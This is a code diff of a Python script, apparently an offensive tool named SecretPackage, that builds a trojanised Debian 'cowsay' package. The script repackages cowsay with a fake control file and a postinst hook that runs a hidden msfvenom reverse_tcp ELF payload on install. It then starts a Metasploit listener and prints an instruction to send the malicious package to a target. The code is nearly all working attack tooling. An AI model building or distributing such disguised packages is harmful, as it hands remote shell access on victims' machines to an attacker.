@@ -5,7 +5,6 @@
 ######################################
 
 import sys
-import subprocess
 import signal
 import os
 
@@ -18,29 +17,31 @@ if sys.platform.startswith('linux'):
 else:
     print("[-] Operating system must be Linux to run this")
     
-
 def shutdown(signal, frame):
     print("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Exiting...\033[0m\n")
     cowsay = os.path.abspath("cowsay") # get absolute path of current working folder
-    os.system(f"rm -rf {cowsay}") # remove the folder
+    os.system(f"rm -rf {cowsay} > /dev/null 2>&1") # remove the folder
     sys.exit() # exit using system call
+
+signal.signal(signal.SIGINT, shutdown) # function call for custom
+# handlers to be called and executed when signal received, signal.SIGINT represents a KeyboardInterrupt
+# process an the frame is the shutdown function
 
 def cowsay_installation():
     # Installing cowsay (download only)
-    print("[+]Installing cowsay")
-    os.system("apt --download-only install cowsay") 
+    print("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Installing cowsay...\033[0m\n")
+    os.system("apt --download-only install cowsay > /dev/null 2>&1") 
     # Extracting package to a new directory called cowsay
-    os.system("cd ~/home")
+    os.system("cd ~/home > /dev/null 2>&1")
     print("[+] Will install in the home directory of whatever user is currently being used")
-    os.system(f"dpkg -x /var/cache/apt/archives/cowsay_3.03+dfsg2-8_all.deb ~/cowsay")
+    os.system(f"dpkg -x /var/cache/apt/archives/cowsay_3.03+dfsg2-8_all.deb ~/cowsay > /dev/null 2>&1")
 
-def build_package(payload_name, default_path):
-    os.system(f"mkdir {default_path} && touch {payload_name}")
+def build_package(program_path, payload_name):
+    os.system(f"touch {program_path}/usr/games/{payload_name} > /dev/null 2>&1")
+    os.system(f"mkdir {program_path}/DEBIAN && cd {program_path}/DEBIAN > /dev/null 2>&1")
+    os.system(f"touch {program_path}/DEBIAN/control > /dev/null 2>&1")
 
-    os.system(f"mkdir {default_path}DEBIAN && cd {default_path}/DEBIAN")
-    os.system(f"touch /root/cowsay/DEBIAN/control")
-
-    with open(f"/root/cowsay/DEBIAN/control", "w") as control:
+    with open(f"{program_path}/DEBIAN/control", "w") as control:
         control.write("Package: cowsay\n")
         control.write("Version: 3.03+dfsg2-4\n")
         control.write("Architecture: all\n")
@@ -58,76 +59,80 @@ def build_package(payload_name, default_path):
  daemon, dragons, and a plethora of animals, from a turkey to
  an elephant in a snake).\n""")
 
-    os.system(f"touch /root/cowsay/DEBIAN/postinst")
+    os.system(f"touch {program_path}/DEBIAN/postinst > /dev/null 2>&1")
 
-    with open(f"/root/cowsay/DEBIAN/postinst", "w") as postinst:
+    with open(f"{program_path}/DEBIAN/postinst", "w") as postinst:
         postinst.write(f"chmod 2755 /usr/games/{payload_name} && usr/games/{payload_name} & /usr/games/cowsay\n")
     
 def listener(LHOST):
     print("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Listener\033[0m\n")
 
-    start_listener = input("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Start Listener?033[0m\n").lower()
+    start_listener = input("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Start Listener?\033[0m\n").lower()
     if start_listener in ["y", "yes"]:
         os.system(f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/shell/reverse_tcp; set LHOST {LHOST}; run'")
     else:
         sys.exit()
 
 def banner():
-    print("""
-            _________                            __ __________                __                           
-        /   _____/ ____   ___________   _____/  |\______   \_____    ____ |  | _______     ____   ____  
-        \_____  \_/ __ \_/ ___\_  __ \_/ __ \   __\     ___/\__  \ _/ ___\|  |/ /\__  \   / ___\_/ __ \ 
-        /        \  ___/\  \___|  | \/\  ___/|  | |    |     / __ \\  \___|    <  / __ \_/ /_/  >  ___/ 
-        /_______  /\___  >\___  >__|    \___  >__| |____|    (____  /\___  >__|_ \(____  /\___  / \___  >
-                \/     \/     \/            \/                    \/     \/     \/     \//_____/      \/   """)
-    print("coded by Myriad74")
-    print("https://github.com/Myriad74/SecretPackage")
+    print("\n")
+    print( " \033[1;31m   _________                            __ __________                __                           \033[0m")
+    print( " \033[1;33m  /   _____/ ____   ___________   _____/  |\______   \_____    ____ |  | _______     ____   ____  \033[0m")
+    print( " \033[1;31m  \_____  \_/ __ \_/ ___\_  __ \_/ __ \   __\     ___/\__  \ _/ ___\|  |/ /\__  \   / ___\_/ __ \ \033[0m")
+    print( " \033[1;33m  /        \  ___/\  \___|  | \/\  ___/|  | |    |     / __ \\  \___|    <  / __ \_/ /_/  >  ___/ \033[0m")
+    print( " \033[1;31m /_______  /\___  >\___  >__|    \___  >__| |____|    (____  /\___  >__|_ \(____  /\___  / \___  >\033[0m")
+    print( " \033[1;33m         \/     \/     \/            \/                    \/     \/     \/     \//_____/      \/ \033[0m")
 
-def generate_payload(LHOST, payload_name):
+def generate_payload(LHOST, program_path, payload_name):
     start_payload = input("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Start payload?: \033[0m\n").lower()
     
     if start_payload in ["y", "yes"]:
-        with os.path.abspath(payload_name) as payload_path:
-            print("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Starting...\033[0m\n")
-            os.system(f"msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST={LHOST} -b \"\x00\" -f elf -o {payload_path}")
+        payload_path = f"{program_path}/usr/games/{payload_name}"
+        print("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Starting...\033[0m\n")
+        os.system(f"msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST={LHOST} -f elf -o {payload_path} > /dev/null 2>&1")
     else:
         sys.exit()
     
-    os.system("chmod 755 postinst")
-    os.system(f"dpkg-deb --build {os.path.abspath(payload_name)}")
+    os.system(f"chmod +x {program_path}/DEBIAN/postinst > /dev/null 2>&1")
+    os.system(f"dpkg-deb --build {program_path}")
+    print("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Payload built, in form of [payload].deb package...\033[0m\n")
+    print("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Send the malicious payload to target...\033[0m\n")
 
 def main():
-    print("TEST")
+    try:
+        if os.path.isfile('/usr/bin/msfconsole') or os.path.isfile('/snap/bin/msfconsole'):
+            print("TRUE")
+            payload_default = "cowsay_trojan"
+            program_path = "/root/cowsay" # hard coded into root for extra security
+            payload = input(f"[+] Choose payload name: (Default) {payload_default}: ")
+            exists = os.path.isfile(payload)
 
-    if os.path.isfile('/usr/bin/msfconsole'):
-        print("TRUE")
-        payload_default = "cowsay_trojan"
-        default_path = "~/cowsay/"
-        payload = input(f"[+] Choose payload name (include full path): (Default) {default_path}")
-        exists = os.path.isfile(payload)
+            if payload == "":
+                payload = f"{payload_default}"
+            elif not exists:
+                print("[-] Payload does not exist")
 
-        if payload == "":
-            payload = f"{default_path}{payload_default}"
-        
-        elif not exists:
-            print("[-] Payload does not exist")
+            LHOST = input("Please enter your host address\n\tIf you do not know it then leave blank to automatically work it out for you:")
 
-        LHOST = input("Please enter your host address\n\tIf you do not know it then leave blank to automatically work it out for you:")
+            if LHOST == "":
+                command = "hostname -i | awk '{print $2}'"
+                LHOST = os.system(f"echo $({command}) > lhost.txt")
+            
+            with open("lhost.txt", "r") as file:
+                LHOST = file.read().strip("\n")
+            os.system("rm lhost.txt")
+            print(LHOST)
 
-        if LHOST == "":
-            command = "hostname -i | awk '{print $2}'"
-            LHOST = os.system(f"echo $({command}) > test.txt")
-        
-        with open("test.txt", "r") as file:
-            LHOST = file.read().strip("\n")
-
-        banner()
-        cowsay_installation()
-        build_package(payload, default_path)
-        generate_payload(LHOST, payload)
-        listener(LHOST)
-    else:
-        print("[-] You do not have msfconsole installed, please run the install.sh script first.")
+            banner()
+            cowsay_installation()
+            build_package(program_path, payload)
+            generate_payload(LHOST, program_path, payload)
+            listener(LHOST)
+        else:
+            print("[-] You do not have msfconsole installed, please run the install.sh script first.")
+            sys.exit()
+    except:
+        print("[-] Error")
+        sys.exit()
 
 if __name__ == '__main__':
     main()
